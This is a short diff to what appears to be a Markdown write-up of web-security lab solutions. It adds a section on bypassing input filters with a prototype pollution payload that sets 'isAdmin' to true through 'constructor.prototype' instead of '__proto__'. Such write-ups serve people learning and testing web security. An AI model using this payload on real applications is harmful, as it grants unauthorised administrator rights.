@@ -17,6 +17,15 @@ Click Exploit again. In the new tab that loads, append a minus character (-) to 
     "isAdmin":"true"
 }}
 ```
+## Bypassing flawed input filters
+
+```
+"constructor": {
+    "prototype": {
+        "isAdmin":true
+    }
+}
+```
 
 =========================================READ CARLOS/SECRET============================================
 
